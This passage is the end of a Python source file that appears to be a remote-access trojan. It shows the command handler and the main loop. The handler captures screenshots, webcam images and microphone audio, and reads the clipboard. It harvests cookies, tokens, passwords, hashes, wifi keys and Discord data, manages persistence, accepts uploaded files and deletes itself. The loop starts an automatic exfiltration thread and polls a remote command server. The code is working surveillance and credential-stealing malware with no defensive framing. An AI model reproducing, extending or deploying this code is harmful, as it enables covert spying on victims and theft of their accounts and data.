        out(rid, json.dumps(info(), indent=2) + "\n")

    elif t == "ps":
        out(rid, sh("tasklist") if os.name == "nt" else sh("ps aux"))

    elif t == "shot":
        f = screen()
        if f:
            send_file(rid, f)
        else:
            out(rid, "no screenshot backend\n")

    elif t == "cam":
        f = cam()
        if f:
            send_file(rid, f)
        else:
            out(rid, "no camera backend\n")

    elif t == "clip":
        if m.get("op") == "set":
            if which("termux-clipboard-set"):
                sh("termux-clipboard-set '%s'" % a.replace("'", ""))
            elif which("xclip"):
                sh("echo '%s' | xclip -sel c" % a)
            elif which("pbcopy"):
                sh("echo '%s' | pbcopy")
            elif os.name == "nt":
                sh('powershell -NoProfile -w hidden -c "Set-Clipboard -Value \'%s\'"' % a.replace("'", "''"))
            out(rid, "ok\n")
        else:
            r = ""
            if which("termux-clipboard-get"):
                r = sh("termux-clipboard-get")
            elif which("pbpaste"):
                r = sh("pbpaste")
            elif which("xclip"):
                r = sh("xclip -o -sel c")
            elif os.name == "nt":
                r = sh('powershell -NoProfile -w hidden -c "Get-Clipboard"')
            out(rid, r + "\n")

    elif t == "toast":
        sh("termux-toast '%s'" % a.replace("'", ""))
        out(rid, "ok\n")

    elif t == "vibrate":
        sh("termux-vibrate -d %s" % (a or "800"))
        out(rid, "ok\n")

    elif t == "audio":
        try:
            n = max(1, min(120, int(a or 6)))
        except ValueError:
            n = 6
        f = os.path.join(tempfile.gettempdir(), "a_%d.m4a" % time.time())
        sh("termux-microphone-record -l %d -f '%s'" % (n, f), t=n + 30)
        if os.path.exists(f) and os.path.getsize(f) > 0:
            send_file(rid, f)
        else:
            out(rid, "no audio backend\n")

    elif t in ("tg", "all"):
        harvest(rid, "all")

    elif t == "cookies":
        harvest(rid, "cookies")

    elif t == "tokens":
        harvest(rid, "tokens")

    elif t == "passwords":
        harvest(rid, "passwords")

    elif t == "hash":
        harvest(rid, "hashes")

    elif t == "wifi":
        harvest(rid, "wifi")

    elif t == "discord":
        harvest(rid, "discord")

    elif t == "persist":
        out(rid, persist() + "\n")

    elif t == "unpersist":
        out(rid, unpersist() + "\n")

    elif t == "put_begin":
        UPS[m["fid"]] = {"n": os.path.basename(m.get("name") or "f.bin"), "b": []}

    elif t == "put_chunk":
        e = UPS.get(m["fid"])
        if e is not None:
            e["b"].append(base64.b64decode(m.get("d") or ""))

    elif t == "put_end":
        e = UPS.pop(m["fid"], None)
        if e:
            d = os.path.join(_cwd(), e["n"])
            with open(d, "wb") as f:
                f.write(b"".join(e["b"]))
            out(rid, "saved %s (%d b)\n" % (d, os.path.getsize(d)))

    elif t == "sd":
        try:
            unpersist()
        except Exception:
            pass
        out(rid, "bye\n")
        time.sleep(1)
        try:
            os.remove(os.path.abspath(__file__))
        except Exception:
            pass
        os._exit(0)

    elif t == "kill":
        out(rid, "bye\n")
        time.sleep(1)
        os._exit(0)


def main():
    _mark()
    threading.Thread(target=auto_exfil, daemon=True).start()

    back = 2
    while True:
        if post({"t": "hello", "info": info()}):
            break
        time.sleep(back)
        back = min(back * 2, 60)

    n = 0
    while True:
        try:
            raw = http("/p/" + SID, timeout=45)
            cmds = json.loads(raw).get("c", [])
            back = 2
        except Exception:
            time.sleep(back)
            back = min(back * 2, 60)
            continue
        n += 1
        if n % 30 == 0:
            _mark()
            post({"t": "hello", "info": info()})
        for c in cmds:
            try:
                handle(c)
            except Exception as e:
                out(c.get("id"), "ERR %s\n" % e)
        time.sleep(POLL + random.random())


if __name__ == "__main__":
    main()
